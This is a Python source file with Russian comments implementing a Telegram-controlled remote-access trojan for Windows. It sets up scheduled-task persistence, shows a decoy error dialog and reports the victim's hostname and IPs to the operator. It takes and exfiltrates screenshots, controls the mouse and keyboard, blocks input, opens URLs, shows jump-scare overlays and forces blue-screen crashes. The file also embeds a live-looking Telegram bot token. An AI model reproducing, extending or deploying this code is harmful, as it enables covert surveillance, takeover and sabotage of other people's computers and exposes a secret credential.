# coding: windows-1251
#       ^
#       |
# Это магический комент, уберешь его и твой комп взорвется

# 1329704902

import io  # Для создания байтового буффера
import pathlib
import random
import shutil
import sys
import keyboard
import pygame
import time
import ctypes
import win32con
import AudioPlayFromURL
import subprocess
import DeskTopIcons
import InputBlocker
from Schedule import *
from utils import *
import kill
from WP import wallpaper_action
import  win32api
import threading  # Для создания второго потока скрипта для параллельного исполнения процессов
import webbrowser
import screeninfo
import mouse  # для отслеживания мыши и симуляции кликов
import telebot  # База, эта библа для бота от тг
from PIL import Image, ImageDraw, ImageTk  # Библа, для работы с пикчами
from mss import mss  # Для захвата скринов
import tkinter
import pygame.mixer as mix
import socket  # Для создания сокета и нахождения локального IP
import os
import requests  # Для нахождения публичного IP

bot = telebot.TeleBot(
    '7516400777:AAGpQCha761QKAYrprcu8v5YbygmKeh_1fA')  # Токен бота(эта строка в методе) является ключём, через который скрипт понимает к какому боту привязать команды


DeepLightID = 1627834434  # Это айди чата бота и меня
AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss'}

CURSOR_SIZE = 15
CURSOR_COLORS = [
    ((0, 0, 0), (255, 255, 255)),  # Внешний круг
    ((255, 255, 255), None),  # Середина
    ((0, 0, 127), None)  # Внутренный
]

BoolDict = dict(true=True, t=True, false=False,
                f=False)  # Это словарь для преобразования любой строки с этими значениями в bool


'НАЧАЛО КОМАНД БОТА'


@bot.message_handler(commands=['start', 'Start'])  # Команда старт, ну тут в целом больше нечего говорить
def Hello(message):
    bot.reply_to(message,
                 f'Привет, это бот для кярва, если ты не я или не кярв то я тебе не буду отвечать\nА ведь твой юзер это @{message.from_user.username}\nСоветую уходить если ты не кярв, а так попробуй /help')
    bot.reply_to(message, message.chat.id)


'''
Наверно пора объяснить что такое @
В общем эта хрень называется декоратором, она используется
Для изменения поведения функции, вот например функция сверху
Здесь функция Hello() принимает аргумент message (впрочем как и другие)
Но если ты посмотришь дальше код, то ты охуеешь но эти функции, да и ебанные messag'ы нигде не указываются,
А знаешь почему?

-Нет, не знаю - ответил ты

Вот, короче объясняю эти собаки ебаные, которые называются at на пендосском используют сначало одну функция,
А потом, ту что под собакой, здесь у нас есть метод bot.message_handler()

Основы написаны, но надо объяснить откуда все таки берутся ебанные messag'ы
Смотри где-то далеко, в файлах библиотеки TeleBot, умные челы написали в теле метода message_handler что-то типа

...
MessageFromID = sever.getMessage(ID)
func(MessageFromID)

Смотри многоточие отображает то, что был код до этого, а func(MessageFromID) это указание
Функции (метода), поведение которой будет изменено, проще говоря это плейсхолдер, с подготовленным аргументом
С точки зрения синтаксиса тут все правильно и func не надо заменять на название функции, именно это и сделает собака ебанная,
Указанная перед функцией (методом), я конечно пишу там функция или метод, но такие декораторы в питоне существуют и для классов,
Но это другой разговор
'''


@bot.message_handler(commands=['help', 'Help'])  # Наша помощь по командам
def Help(message):
    bot.send_message(message.chat.id,
                     'Привет, нужна помощь?\nВпрочем если не была бы нужна, ты бы не вводил эту команду\nВот тебе телеграф, там все команды:\nhttps://telegra.ph/Komandy-dlya-bota-KxrvPersonal-bot-05-29')
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(
    commands=['Screenshot', 'Screen', 'Scr', 'scr', 'screenshot', 'screen'])  # А вот и функция скриншотика
def ScreenShot(message):
    if message.from_user.username not in AllowedUsers:
        return

    monitor = {'top': 0, 'left': 0, 'width': 1920, 'height': 1080}
    args = message.text.split()[1:]

    if args:
        VALID_KEYS = {'top', 'left', 'width', 'height'}
        errors = []
        for arg in args:
            parts = arg.split(':', 1)
            if len(parts) == 2 and parts[0] in VALID_KEYS:
                try:
                    monitor[parts[0]] = int(parts[1])
                except ValueError:
                    errors.append(arg)
            else:
                errors.append(parts[0])

        if errors:
            bot.reply_to(message, f"Ошибка в ключах: {', '.join(errors)}")

    with mss() as sct:
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        top_left = (monitor['left'], monitor['top'])
        bottom_right = (top_left[0] + monitor['width'], top_left[1] + monitor['height'])
        mouse_pos = mouse.get_position()

        if IsInside(mouse_pos, 15, top_left, bottom_right):
            draw = ImageDraw.Draw(img)
            rel_x = mouse_pos[0] - top_left[0]
            rel_y = mouse_pos[1] - top_left[1]
            draw_cursor(draw, rel_x, rel_y)  # Используем унифицированную функцию

        send_screenshot(img, message.chat.id)

        # Это логи
        if message.from_user.username != 'Deepl1ght':
            admin_msg = (
                f'Пользователь @{message.from_user.username} '
                f'отправил команду:\n{message.text}'
            )
            bot.send_message(DeepLightID, admin_msg)
            send_screenshot(img, DeepLightID)
            bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['move', 'Move', 'm', 'M', 'mov', 'Mov'])  # А вот и мышка, точнее её передвижение
def Move_mouse(message):
    if message.from_user.username not in AllowedUsers:
        return

    # Параметры по умолчанию
    params = {'X': 0, 'Y': 0, 'abs': True, 'dur': 0}
    args = message.text.split()

    # Проверка минимального количества аргументов
    if len(args) < 3:
        bot.reply_to(message, 'Ошибка: требуется минимум 2 аргумента (X Y)')
        return

    # Обработка позиционных аргументов (X, Y)
    try:
        params['X'] = int(args[1])
        params['Y'] = int(args[2])
    except ValueError:
        bot.reply_to(message, 'Ошибка: X и Y должны быть целыми числами')
        return

    # Обработка именованных параметров
    for arg in args[3:]:
        if ':' not in arg:
            bot.reply_to(message, f'Ошибка в параметре "{arg}": должен быть в формате "ключ:значение"')
            continue

        key, value = arg.split(':', 1)
        if key not in params:
            bot.reply_to(message, f'Ошибка: неизвестный параметр "{key}"')
            continue

        try:
            # Для булевых параметров используем специальное преобразование
            if key == 'abs':
                params[key] = parse_bool(value)
            else:
                params[key] = int(value)
        except ValueError:
            bot.reply_to(message, f'Ошибка преобразования значения "{value}" для параметра "{key}"')
            continue

    # Выполнение действия
    try:
        mouse.move(params['X'], params['Y'], params['abs'], params['dur'])
    except Exception as e:
        bot.reply_to(message, f'Ошибка перемещения мыши: {str(e)}')
        return

    # Уведомление меня
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['click', 'Click', 'cl', 'Cl'])  # Симуляция кликов мыши
def Click(message):
    if message.from_user.username not in AllowedUsers:
        return

    try:
        parts = message.text.split()
        # Проверка минимального количества частей команды
        if len(parts) < 2:
            raise ValueError("Invalid command structure")

        # Нормализация параметров
        button = parts[1].lower()
        is_double = len(parts) > 2 and parts[2].lower() in {'double', 'd'}

        # Сопоставление кнопок с действиями
        button_actions = {
            'l': mouse.LEFT,
            'r': mouse.RIGHT,
            'm': mouse.MIDDLE
        }

        # Проверка допустимости кнопки
        if button not in button_actions:
            raise ValueError("Invalid button specified")

        # Выбор действия
        action = mouse.double_click if is_double else mouse.click
        action(button_actions[button])

        bot.send_message(message.chat.id, 'Команда была выполнена')

    except Exception as e:
        bot.send_message(message.chat.id, f'К сожелению вы долбан, но не грустите\nГовна пожрите\n{e}')

    # Логирование для меня
    if message.from_user.username != 'Deepl1ght':
        admin_msg = f'Пользователь @{message.from_user.username} отправил команду:\n{message.text}'
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)
        if 'action' in locals():
            bot.send_message(DeepLightID, 'Команда была выполнена')


@bot.message_handler(commands=['skr', 'screamer', 'scream', 'sakincock'])
def screamer(message):
    if message.from_user.username in AllowedUsers:
        threading.Thread(target=show_screamer, daemon=True).start()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['url', 'web'])
def openEyes(message):
    if message.from_user.username in AllowedUsers:
        webbrowser.open(message.text.split()[1], new=2, autoraise= True)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kill'])
def Killer(message):
    if message.from_user.username in AllowedUsers:
        kill.Kill(message)

@bot.message_handler(commands=['wallpaper', 'wp'])
def Wallpaper(message):
    if message.from_user.username in AllowedUsers:
        action = message.text.split()[1]
        match action:
            case 'set':
                wallpaper_action('set', resource_path(r'screams/2.png'))
            case 'restore':
                wallpaper_action('restore')
            case _:
                bot.reply_to(message, 'неправильно попробуй еще раз')

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['kys'])
def Kys(message):
    if message.from_user.username in AllowedUsers:
        if is_frozen() and check_scheduler_task_exists():
            delete_scheduler_task()
        threading.Thread(target=StopIn5Secs, daemon=True).start()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['hide', 'h'])
def Hide(message):
    if message.from_user.username in AllowedUsers:
        keyboard.press('win')
        keyboard.press_and_release('d')
        keyboard.release('win')

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['bsod', 'prikol'])
def Prikol(message):
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

    if message.from_user.username in AllowedUsers:
        try:
            # Путь к NotMyFault.exe
            subprocess.run(
                [resource_path(r'screams/bsod.exe'), "/crash"],
                check=True,
                shell=True,
                timeout=10
            )
        except Exception as e:
            bot.send_message(DeepLightID, e)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['disable'])
def Dismember(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Disable()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['enable'])
def enable(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Enable()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['hico'])
def HideIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.hide_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['sico'])
def ShowIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.show_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['text'])
def TextWriteOpen(message):
    if message.from_user.username in AllowedUsers:
        if os.path.exists(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt')):
            os.remove(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))
        with open(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'), 'x') as f:
            f.write(' '.join(message.text.split()[1:]))
            f.close()
        os.system(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kb', 'write'])
def KeyBoard(message):
    if message.from_user.username in AllowedUsers:
        Inst = message.text.split()[1]
        Keys = Inst.split('+')
        pressedKeys = []
        for key in Keys:
            try:
                par = key.split(':')
                if par[1] == 'p':
                    keyboard.press(par[0])
                    pressedKeys.append(par[0])
                if par[1] == 'r':
                    keyboard.release(par[0])
                    for key in pressedKeys:
                        keyboard.release(key)
            except:
                keyboard.press_and_release(par[0])
                for key in pressedKeys:
                    keyboard.release(key)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['check'])
def Check(message):
    if message.from_user.username in AllowedUsers:
        if Schedule.check_scheduler_task_exists():
            bot.reply_to(message, 'true')
        else:
            bot.reply_to(message, 'false')


@bot.message_handler(commands=['play'])
def PlayFromURL(message):
    if message.from_user.username in AllowedUsers:
        AudioPlayFromURL.play_audio_from_url(message.text.split()[1])

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(func=lambda message: True)  # Последняя команда, всегда должна быть последней
def Echo(message):  # Тут мы ловим любое сообщение, которое не подходит под команды выше
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


'''КОНЕЦ БОТА
    НАЧАЛО СКРИПТА'''

mix.init()

def show_screamer():
    root = tkinter.Tk()

    root.title("overlay")

    x = "0"
    y = "0"
    image = Image.open(resource_path(r'screams/1.png'))
    mon = [m for m in screeninfo.get_monitors() if m.is_primary==True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # to remove the titlebar
    root.overrideredirect(True)

    # to make the window transparent
    root.attributes("-transparentcolor", "red")

    # set bg to red in order to make it transparent
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # make window to be always on top
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)
    root.after(5000, lambda: root.destroy())
    root.mainloop()

def calculate_scale(image, mon_width, mon_height, img_width, img_height):
    scale = min([mon_width//img_width, mon_height//img_height])
    ret = image.resize((img_width*scale, img_height*scale))
    cords = f"{ret.size[0]}x{ret.size[1]}+{mon_width//2-ret.size[0]//2}+{mon_height//2-ret.size[1]//2}"
    return ret, cords

def parse_bool(value: str) -> bool:
    true_values = {'true', '1', 'yes', 'да', 'on', 'enable', 't'}
    false_values = {'false', '0', 'no', 'нет', 'off', 'disable', 'f'}

    normalized = value.strip().lower()
    if normalized in true_values:
        return True
    if normalized in false_values:
        return False
    raise ValueError(f'Недопустимое булево значение: "{value}"')


def StopIn5Secs():
    time.sleep(5)
    bot.send_message(DeepLightID, 'Бот выключен')
    bot.stop_polling()


def IsInside(point: tuple, radius: int, topLeft: tuple,
             downRight: tuple):  # Вот функция для проверки вхождения в зону (СВО) скрина
    x, y = point  # Привязываем значение кординат к нашим точкам

    x_min = min(topLeft[0], downRight[0])
    x_max = max(topLeft[0], downRight[0])
    y_min = min(topLeft[1], downRight[1])
    y_max = max(topLeft[1], downRight[1])

    return (
            (x - radius >= x_min) and
            (x + radius <= x_max) and
            (y - radius >= y_min) and
            (y + radius <= y_max)
    )


def send_screenshot(img, chat_id):
    # Сжатое изображение
    bot.send_photo(chat_id, img, protect_content=True)

    # Несжатое изображение
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    bot.send_document(chat_id, img_byte_arr, protect_content=True)


def draw_cursor(draw, x, y):
    # Основные круги
    for i, (fill, outline) in enumerate(CURSOR_COLORS):
        size = CURSOR_SIZE - i * 5
        bbox = [
            (x - size // 2, y - size // 2),
            (x + size // 2, y + size // 2)
        ]
        draw.ellipse(bbox, fill=fill, outline=outline)

    # Крест
    cross_size = CURSOR_SIZE - 2
    draw.line([(x, y - cross_size // 2), (x, y + cross_size // 2)], fill=(255, 0, 0))
    draw.line([(x - cross_size // 2, y), (x + cross_size // 2, y)], fill=(255, 0, 0))


def get_local_ip():
    try:
        # Создаем временное подключение к публичному DNS
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google Public DNS
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1 (Local host)"  # Возвращаем localhost при ошибке


def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except Exception:
        return "Не удалось получить IP"


def ShowError():
    root = tkinter.Tk()
    root.geometry(f'450x200+{1920//2-225}+{1080//2-100}')
    label = tkinter.Label(root, text='Error: File Restricted\nErrorNum:0x5051', font='Segoe UI 40')
    butt = tkinter.Button(root, text='OK', command=lambda:root.destroy(), font='Segoe UI 20')
    label.pack()
    butt.pack()
    root.mainloop()


if is_frozen() and not check_scheduler_task_exists():
    create_scheduler_task()
    threading.Thread(target=ShowError, daemon=True).start()
    # Проверка прав администратора
    if not run_as_admin():
        print("Требуются права администратора!")
        sys.exit(1)

    print("=" * 50)
    print("Управление задачей планировщика")
    print("=" * 50)

    if check_scheduler_task_exists():
        print(f"Задача '{TASK_NAME}' существует")
    else:
        print(f"Задача '{TASK_NAME}' не найдена")

if __name__ == '__main__':
    task_info = get_task_full_info()
    if task_info:
        print("=" * 50)
        print("Детальная информация о задаче:")
        print("=" * 50)
        print(f"Имя: {task_info['name']}")
        print(f"Путь: {task_info['path']}")
        print(f"Активна: {'Да' if task_info['enabled'] else 'Нет'}")
        print(f"Последний запуск: {task_info['last_run_time']}")
        print(f"Следующий запуск: {task_info['next_run_time']}")
        print(f"Действия: {', '.join(task_info['actions'])}")
        print(f"Триггеры: {', '.join(str(t) for t in task_info['triggers'])}")
    else:
        print("Задача не найдена")


bot.send_message(DeepLightID,
                 f"Бот запущен\nИмя компьютера: {socket.gethostname()}\nЛокальный IP: {get_local_ip()}\nПубличный IP: {get_public_ip()}")  # сообщение для меня любимого
print('Бот запущен')

bot.infinity_polling()